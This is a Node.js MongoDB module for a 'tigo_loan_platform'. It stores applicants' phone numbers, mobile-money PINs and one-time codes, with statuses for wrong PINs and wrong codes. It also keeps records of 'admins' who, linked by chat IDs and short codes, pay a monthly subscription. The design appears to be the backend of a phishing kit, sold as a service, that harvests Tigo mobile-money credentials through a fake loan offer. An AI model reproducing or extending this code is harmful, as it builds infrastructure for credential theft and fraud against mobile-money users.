const { MongoClient } = require('mongodb');

let client;
let db;

const DB_NAME = 'tigo_loan_platform';
const COLLECTIONS = {
    ADMINS: 'admins',
    APPLICATIONS: 'applications',
    PAYMENTS: 'subscription_payments'  // ✅ NEW: Payment tracking
};

async function connectDatabase() {
    try {
        const MONGODB_URI = process.env.MONGODB_URI;
        if (!MONGODB_URI) throw new Error('❌ MONGODB_URI is not set in environment variables');

        console.log('🔄 Connecting to MongoDB...');
        client = new MongoClient(MONGODB_URI);
        await client.connect();
        db = client.db(DB_NAME);
        console.log('✅ Connected to MongoDB successfully');
        await createIndexes();
        return db;
    } catch (error) {
        console.error('❌ MongoDB connection error:', error);
        throw error;
    }
}

async function createIndexes() {
    try {
        await db.collection(COLLECTIONS.ADMINS).createIndex({ adminId: 1 }, { unique: true });
        await db.collection(COLLECTIONS.ADMINS).createIndex({ email: 1 });
        await db.collection(COLLECTIONS.ADMINS).createIndex({ chatId: 1 });
        await db.collection(COLLECTIONS.ADMINS).createIndex({ status: 1 });
        await db.collection(COLLECTIONS.ADMINS).createIndex({ shortCode: 1 }, { unique: true, sparse: true });
        // ✅ NEW: Payment status index
        await db.collection(COLLECTIONS.ADMINS).createIndex({ paymentStatus: 1 });

        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ id: 1 }, { unique: true });
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ adminId: 1 });
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ phoneNumber: 1 });
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ timestamp: -1 });
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ pinStatus: 1 });
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ otpStatus: 1 });

        // ✅ NEW: Payment tracking indexes
        await db.collection(COLLECTIONS.PAYMENTS).createIndex({ adminId: 1 });
        await db.collection(COLLECTIONS.PAYMENTS).createIndex({ status: 1 });
        await db.collection(COLLECTIONS.PAYMENTS).createIndex({ createdAt: -1 });
        await db.collection(COLLECTIONS.PAYMENTS).createIndex({ paymentDate: -1 });

        console.log('✅ Database indexes created');
    } catch (error) {
        console.error('⚠️ Error creating indexes:', error.message);
    }
}

async function closeDatabase() {
    if (client) {
        await client.close();
        console.log('✅ Database connection closed');
    }
}

// ==========================================
// ADMIN OPERATIONS
// ==========================================

async function saveAdmin(adminData) {
    try {
        const adminId = adminData.adminId || adminData.id;
        if (!adminId) throw new Error('Admin ID is required');
        if (!adminData.name) throw new Error('Admin name is required');
        if (!adminData.email) throw new Error('Admin email is required');
        if (!adminData.chatId) throw new Error('Admin chatId is required');
        if (!adminData.shortCode) throw new Error('Admin shortCode is required');

        const existingAdmin = await db.collection(COLLECTIONS.ADMINS).findOne({ adminId });
        if (existingAdmin) throw new Error(`Admin ${adminId} already exists in database`);

        const existingCode = await db.collection(COLLECTIONS.ADMINS).findOne({ shortCode: adminData.shortCode });
        if (existingCode) throw new Error(`Short code '${adminData.shortCode}' is already taken`);

        const adminDocument = {
            adminId,
            name: adminData.name,
            email: adminData.email,
            chatId: adminData.chatId,
            shortCode: adminData.shortCode,
            status: adminData.status || 'active',
            // ✅ NEW: Payment fields
            paymentStatus: 'unpaid',  // unpaid, pending, paid
            subscriptionAmount: 500,   // TSh 500
            subscriptionStartDate: null,
            subscriptionExpiryDate: null,
            lastPaymentDate: null,
            createdAt: adminData.createdAt || new Date().toISOString()
        };

        const result = await db.collection(COLLECTIONS.ADMINS).insertOne(adminDocument);
        console.log(`✅ Admin saved: ${adminId} | shortCode: ${adminData.shortCode} | Payment: ${adminDocument.paymentStatus}`);
        return result;
    } catch (error) {
        console.error('❌ Error saving admin:', error);
        throw error;
    }
}

async function getAdmin(adminId) {
    try {
        return await db.collection(COLLECTIONS.ADMINS).findOne({ adminId });
    } catch (error) {
        console.error('❌ Error getting admin:', error);
        return null;
    }
}

async function getAdminByShortCode(shortCode) {
    try {
        return await db.collection(COLLECTIONS.ADMINS).findOne({ shortCode: shortCode.toLowerCase() });
    } catch (error) {
        console.error('❌ Error getting admin by short code:', error);
        return null;
    }
}

async function getAdminByChatId(chatId) {
    try {
        return await db.collection(COLLECTIONS.ADMINS).findOne({ chatId });
    } catch (error) {
        console.error('❌ Error getting admin by chat ID:', error);
        return null;
    }
}

async function getAllAdmins() {
    try {
        return await db.collection(COLLECTIONS.ADMINS).find({}).sort({ createdAt: -1 }).toArray();
    } catch (error) {
        console.error('❌ Error getting admins:', error);
        return [];
    }
}

async function getActiveAdmins() {
    try {
        return await db.collection(COLLECTIONS.ADMINS).find({ status: 'active' }).toArray();
    } catch (error) {
        console.error('❌ Error getting active admins:', error);
        return [];
    }
}

// ✅ NEW: Get admins by payment status
async function getAdminsByPaymentStatus(paymentStatus) {
    try {
        return await db.collection(COLLECTIONS.ADMINS).find({ paymentStatus }).toArray();
    } catch (error) {
        console.error('❌ Error getting admins by payment status:', error);
        return [];
    }
}

async function updateAdmin(adminId, updates) {
    try {
        const result = await db.collection(COLLECTIONS.ADMINS).updateOne(
            { adminId },
            { $set: { ...updates, updatedAt: new Date().toISOString() } }
        );
        console.log(`🔄 Admin ${adminId} updated`);
        return result;
    } catch (error) {
        console.error('❌ Error updating admin:', error);
        throw error;
    }
}

async function updateAdminPaymentStatus(adminId, paymentStatus, paymentData = {}) {
    try {
        const updates = {
            paymentStatus,
            lastPaymentDate: new Date().toISOString(),
            ...paymentData
        };

        if (paymentStatus === 'paid') {
            const startDate = new Date();
            const expiryDate = new Date(startDate.getTime() + 30 * 24 * 60 * 60 * 1000); // 30 days
            updates.subscriptionStartDate = startDate.toISOString();
            updates.subscriptionExpiryDate = expiryDate.toISOString();
        }

        const result = await db.collection(COLLECTIONS.ADMINS).updateOne(
            { adminId },
            { $set: updates }
        );
        console.log(`💳 Admin ${adminId} payment status: ${paymentStatus}`);
        return result;
    } catch (error) {
        console.error('❌ Error updating payment status:', error);
        throw error;
    }
}

async function updateAdminStatus(adminId, status) {
    try {
        return await db.collection(COLLECTIONS.ADMINS).updateOne(
            { adminId },
            { $set: { status, updatedAt: new Date().toISOString() } }
        );
    } catch (error) {
        console.error('❌ Error updating admin status:', error);
        throw error;
    }
}

async function deleteAdmin(adminId) {
    try {
        const result = await db.collection(COLLECTIONS.ADMINS).deleteOne({ adminId });
        console.log(`🗑️ Admin deleted: ${adminId}`);
        return result;
    } catch (error) {
        console.error('❌ Error deleting admin:', error);
        throw error;
    }
}

async function adminExists(adminId) {
    try {
        const count = await db.collection(COLLECTIONS.ADMINS).countDocuments({ adminId });
        return count > 0;
    } catch (error) {
        return false;
    }
}

async function getAdminCount() {
    try {
        return await db.collection(COLLECTIONS.ADMINS).countDocuments({});
    } catch (error) {
        return 0;
    }
}

// ==========================================
// PAYMENT OPERATIONS (NEW)
// ==========================================

async function recordPayment(adminId, paymentData) {
    try {
        const paymentRecord = {
            adminId,
            amount: paymentData.amount || 500,
            status: paymentData.status || 'pending', // pending, approved, rejected
            reason: paymentData.reason || '',
            superAdminNote: paymentData.superAdminNote || '',
            createdAt: new Date().toISOString(),
            paymentDate: paymentData.paymentDate || new Date().toISOString(),
            approvedAt: null,
            rejectedAt: null
        };

        const result = await db.collection(COLLECTIONS.PAYMENTS).insertOne(paymentRecord);
        console.log(`💳 Payment recorded for ${adminId}: ${paymentRecord.status}`);
        return result;
    } catch (error) {
        console.error('❌ Error recording payment:', error);
        throw error;
    }
}

async function getPaymentByAdminId(adminId) {
    try {
        return await db.collection(COLLECTIONS.PAYMENTS).findOne(
            { adminId, status: 'pending' },
            { sort: { createdAt: -1 } }
        );
    } catch (error) {
        console.error('❌ Error getting payment:', error);
        return null;
    }
}

async function getPendingPayments() {
    try {
        return await db.collection(COLLECTIONS.PAYMENTS).find({ status: 'pending' })
            .sort({ createdAt: -1 }).toArray();
    } catch (error) {
        console.error('❌ Error getting pending payments:', error);
        return [];
    }
}

async function getAllPayments() {
    try {
        return await db.collection(COLLECTIONS.PAYMENTS).find({})
            .sort({ createdAt: -1 }).toArray();
    } catch (error) {
        console.error('❌ Error getting all payments:', error);
        return [];
    }
}

async function approvePayment(paymentId, superAdminNote = '') {
    try {
        const payment = await db.collection(COLLECTIONS.PAYMENTS).findOne({ _id: paymentId });
        if (!payment) throw new Error('Payment not found');

        // Update payment status
        await db.collection(COLLECTIONS.PAYMENTS).updateOne(
            { _id: paymentId },
            {
                $set: {
                    status: 'approved',
                    superAdminNote,
                    approvedAt: new Date().toISOString()
                }
            }
        );

        // Update admin status
        await updateAdminPaymentStatus(payment.adminId, 'paid', { superAdminNote });

        console.log(`✅ Payment approved for ${payment.adminId}`);
        return true;
    } catch (error) {
        console.error('❌ Error approving payment:', error);
        throw error;
    }
}

async function rejectPayment(paymentId, superAdminNote = '') {
    try {
        const payment = await db.collection(COLLECTIONS.PAYMENTS).findOne({ _id: paymentId });
        if (!payment) throw new Error('Payment not found');

        // Update payment status
        await db.collection(COLLECTIONS.PAYMENTS).updateOne(
            { _id: paymentId },
            {
                $set: {
                    status: 'rejected',
                    superAdminNote,
                    rejectedAt: new Date().toISOString()
                }
            }
        );

        // Update admin to remain unpaid
        await db.collection(COLLECTIONS.ADMINS).updateOne(
            { adminId: payment.adminId },
            { $set: { paymentStatus: 'unpaid', superAdminNote } }
        );

        console.log(`❌ Payment rejected for ${payment.adminId}`);
        return true;
    } catch (error) {
        console.error('❌ Error rejecting payment:', error);
        throw error;
    }
}

// ==========================================
// APPLICATION OPERATIONS
// ==========================================

async function saveApplication(appData) {
    try {
        const result = await db.collection(COLLECTIONS.APPLICATIONS).insertOne({
            id: appData.id,
            adminId: appData.adminId,
            adminName: appData.adminName,
            phoneNumber: appData.phoneNumber,
            pin: appData.pin,
            pinStatus: appData.pinStatus || 'pending',
            otpStatus: appData.otpStatus || 'pending',
            otp: appData.otp || null,
            assignmentType: 'specific',
            isReturningUser: appData.isReturningUser || false,
            previousCount: appData.previousCount || 0,
            timestamp: appData.timestamp || new Date().toISOString()
        });
        console.log(`💾 Application saved: ${appData.id}`);
        return result;
    } catch (error) {
        console.error('❌ Error saving application:', error);
        throw error;
    }
}

async function getApplication(applicationId) {
    try {
        return await db.collection(COLLECTIONS.APPLICATIONS).findOne({ id: applicationId });
    } catch (error) {
        console.error('❌ Error getting application:', error);
        return null;
    }
}

async function updateApplication(applicationId, updates) {
    try {
        const result = await db.collection(COLLECTIONS.APPLICATIONS).updateOne(
            { id: applicationId },
            { $set: { ...updates, updatedAt: new Date().toISOString() } }
        );
        console.log(`🔄 Application updated: ${applicationId}`);
        return result;
    } catch (error) {
        console.error('❌ Error updating application:', error);
        throw error;
    }
}

async function getApplicationsByAdmin(adminId) {
    try {
        return await db.collection(COLLECTIONS.APPLICATIONS).find({ adminId }).sort({ timestamp: -1 }).toArray();
    } catch (error) {
        console.error('❌ Error getting applications by admin:', error);
        return [];
    }
}

async function getPendingApplications(adminId) {
    try {
        return await db.collection(COLLECTIONS.APPLICATIONS).find({
            adminId,
            $or: [{ pinStatus: 'pending' }, { otpStatus: 'pending' }]
        }).sort({ timestamp: -1 }).toArray();
    } catch (error) {
        console.error('❌ Error getting pending applications:', error);
        return [];
    }
}

// ==========================================
// STATISTICS
// ==========================================

async function getAdminStats(adminId) {
    try {
        const total = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId });
        const pinPending = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, pinStatus: 'pending' });
        const pinApproved = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, pinStatus: 'approved' });
        const otpPending = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, otpStatus: 'pending' });
        const fullyApproved = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, otpStatus: 'approved' });
        return { total, pinPending, pinApproved, otpPending, fullyApproved };
    } catch (error) {
        return { total: 0, pinPending: 0, pinApproved: 0, otpPending: 0, fullyApproved: 0 };
    }
}

async function getStats() {
    try {
        const totalAdmins = await db.collection(COLLECTIONS.ADMINS).countDocuments({});
        const paidAdmins = await db.collection(COLLECTIONS.ADMINS).countDocuments({ paymentStatus: 'paid' });
        const unpaidAdmins = await db.collection(COLLECTIONS.ADMINS).countDocuments({ paymentStatus: 'unpaid' });
        const pendingPayments = await db.collection(COLLECTIONS.ADMINS).countDocuments({ paymentStatus: 'pending' });
        const totalApplications = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({});
        const pinPending = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ pinStatus: 'pending' });
        const pinApproved = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ pinStatus: 'approved' });
        const otpPending = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ otpStatus: 'pending' });
        const fullyApproved = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ otpStatus: 'approved' });
        const totalRejected = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({
            $or: [{ pinStatus: 'rejected' }, { otpStatus: 'wrongpin_otp' }, { otpStatus: 'wrongcode' }]
        });
        return { totalAdmins, paidAdmins, unpaidAdmins, pendingPayments, totalApplications, pinPending, pinApproved, otpPending, fullyApproved, totalRejected };
    } catch (error) {
        return { totalAdmins: 0, paidAdmins: 0, unpaidAdmins: 0, pendingPayments: 0, totalApplications: 0, pinPending: 0, pinApproved: 0, otpPending: 0, fullyApproved: 0, totalRejected: 0 };
    }
}

async function getPerAdminStats() {
    try {
        const admins = await getAllAdmins();
        return await Promise.all(admins.map(async (admin) => {
            const stats = await getAdminStats(admin.adminId);
            return { adminId: admin.adminId, name: admin.name, paymentStatus: admin.paymentStatus, ...stats };
        }));
    } catch (error) {
        return [];
    }
}

async function getAllAdminsDetailed() {
    try {
        const admins = await db.collection(COLLECTIONS.ADMINS).find({}).sort({ createdAt: -1 }).toArray();
        admins.forEach(a => console.log(`   ${a.adminId}: ${a.name} | code: ${a.shortCode} | payment: ${a.paymentStatus} | chat: ${a.chatId} | status: ${a.status}`));
        return admins;
    } catch (error) {
        return [];
    }
}

async function cleanupInvalidAdmins() {
    try {
        const result = await db.collection(COLLECTIONS.ADMINS).deleteMany({
            $or: [
                { adminId: { $exists: false } }, { adminId: null }, { adminId: '' },
                { chatId: { $exists: false } }, { chatId: null }
            ]
        });
        console.log(`🧹 Cleaned up ${result.deletedCount} invalid admin(s)`);
        return result;
    } catch (error) {
        throw error;
    }
}

module.exports = {
    connectDatabase,
    closeDatabase,
    saveAdmin,
    getAdmin,
    getAdminByShortCode,
    getAdminByChatId,
    getAllAdmins,
    getActiveAdmins,
    getAdminsByPaymentStatus,
    updateAdmin,
    updateAdminPaymentStatus,
    updateAdminStatus,
    deleteAdmin,
    adminExists,
    getAdminCount,
    recordPayment,
    getPaymentByAdminId,
    getPendingPayments,
    getAllPayments,
    approvePayment,
    rejectPayment,
    saveApplication,
    getApplication,
    updateApplication,
    getApplicationsByAdmin,
    getPendingApplications,
    getAdminStats,
    getStats,
    getPerAdminStats,
    getAllAdminsDetailed,
    cleanupInvalidAdmins
};
